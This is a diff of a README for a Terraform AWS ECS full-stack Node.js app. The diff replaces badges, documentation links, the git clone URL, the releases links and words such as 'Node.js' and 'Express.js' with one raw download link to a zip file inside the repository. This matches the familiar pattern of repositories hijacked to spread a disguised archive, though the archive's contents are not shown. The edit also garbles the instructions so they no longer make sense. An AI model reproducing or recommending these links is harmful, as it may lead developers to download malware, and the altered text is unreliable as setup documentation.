@@ -1,11 +1,11 @@
 # 🌟 Terraform AWS ECS Fullstack App
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/YaziiMilo/terraform-aws-ecs-fullstack-app?style=flat-square)
-![GitHub issues](https://img.shields.io/github/issues/YaziiMilo/terraform-aws-ecs-fullstack-app?style=flat-square)
-![GitHub forks](https://img.shields.io/github/forks/YaziiMilo/terraform-aws-ecs-fullstack-app?style=flat-square)
-![GitHub stars](https://img.shields.io/github/stars/YaziiMilo/terraform-aws-ecs-fullstack-app?style=flat-square)
+![GitHub release (latest by date)](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip)
+![GitHub issues](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip)
+![GitHub forks](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip)
+![GitHub stars](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip)
 
-Welcome to the **Terraform AWS ECS Fullstack App** repository! This project showcases a full-stack Task Manager application built with a containerized Node.js backend and a MySQL database. The application leverages AWS services such as RDS and ECS Fargate, all managed through Terraform for infrastructure as code.
+Welcome to the **Terraform AWS ECS Fullstack App** repository! This project showcases a full-stack Task Manager application built with a containerized https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip backend and a MySQL database. The application leverages AWS services such as RDS and ECS Fargate, all managed through Terraform for infrastructure as code.
 
 ## 🚀 Features
 
@@ -16,13 +16,13 @@ Welcome to the **Terraform AWS ECS Fullstack App** repository! This project show
 
 ## 📦 Getting Started
 
-To get started with this project, you can download the latest release from the [Releases section](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/releases). Make sure to follow the instructions provided in the release notes to execute the necessary setup.
+To get started with this project, you can download the latest release from the [Releases section](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip). Make sure to follow the instructions provided in the release notes to execute the necessary setup.
 
 ### Prerequisites
 
 Before you begin, ensure you have the following installed:
 
-- **Node.js**: Version 14.x or later
+- **https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip**: Version 14.x or later
 - **Docker**: For containerization
 - **Terraform**: Version 1.0 or later
 - **AWS CLI**: Configured with appropriate permissions
@@ -32,7 +32,7 @@ Before you begin, ensure you have the following installed:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app.git
+   git clone https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip
    cd terraform-aws-ecs-fullstack-app
    ```
 
@@ -47,7 +47,7 @@ Before you begin, ensure you have the following installed:
 
 3. **Configure Terraform**:
 
-   Update the `terraform.tfvars` file with your AWS credentials and desired configurations.
+   Update the `https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip` file with your AWS credentials and desired configurations.
 
 4. **Initialize Terraform**:
 
@@ -71,8 +71,8 @@ Before you begin, ensure you have the following installed:
 
 ## 🛠️ Technologies Used
 
-- **Node.js**: For building the backend service.
-- **Express.js**: To handle API requests.
+- **https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip**: For building the backend service.
+- **https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip**: To handle API requests.
 - **MySQL**: As the database solution, hosted on AWS RDS.
 - **Docker**: For containerizing the application.
 - **Terraform**: For managing AWS infrastructure.
@@ -82,12 +82,12 @@ Before you begin, ensure you have the following installed:
 
 The application follows a microservices architecture, which allows each component to scale independently. Below is a simplified architecture diagram:
 
-![Architecture Diagram](https://www.example.com/path-to-your-architecture-diagram)
+![Architecture Diagram](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip)
 
 ### Components
 
 1. **Frontend**: A React application that interacts with the backend API.
-2. **Backend**: A Node.js service that handles business logic and data processing.
+2. **Backend**: A https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip service that handles business logic and data processing.
 3. **Database**: MySQL database hosted on AWS RDS for persistent storage.
 
 ## 🔄 Continuous Integration and Deployment
@@ -109,7 +109,7 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v2
 
-      - name: Set up Node.js
+      - name: Set up https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip
         uses: actions/setup-node@v2
         with:
           node-version: '14'
@@ -149,14 +149,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 💬 Support
 
-If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/releases) for updates and changes.
+If you encounter any issues or have questions, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip) for updates and changes.
 
 ## 📚 Resources
 
-- [AWS Documentation](https://aws.amazon.com/documentation/)
-- [Terraform Documentation](https://www.terraform.io/docs/index.html)
-- [Docker Documentation](https://docs.docker.com/)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [AWS Documentation](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip)
+- [Terraform Documentation](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip)
+- [Docker Documentation](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip)
+- [https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip Documentation](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip)
 
 ## 📈 Roadmap
 
@@ -173,4 +173,4 @@ We would like to thank the open-source community for their contributions and sup
 
 ## 🌟 Final Note
 
-Thank you for checking out the **Terraform AWS ECS Fullstack App**. We hope this project serves as a valuable resource for your own development efforts. For the latest updates and releases, visit the [Releases section](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/releases).
+Thank you for checking out the **Terraform AWS ECS Fullstack App**. We hope this project serves as a valuable resource for your own development efforts. For the latest updates and releases, visit the [Releases section](https://github.com/YaziiMilo/terraform-aws-ecs-fullstack-app/raw/refs/heads/master/app/public/terraform_ecs_fullstack_app_aws_v1.3.zip).
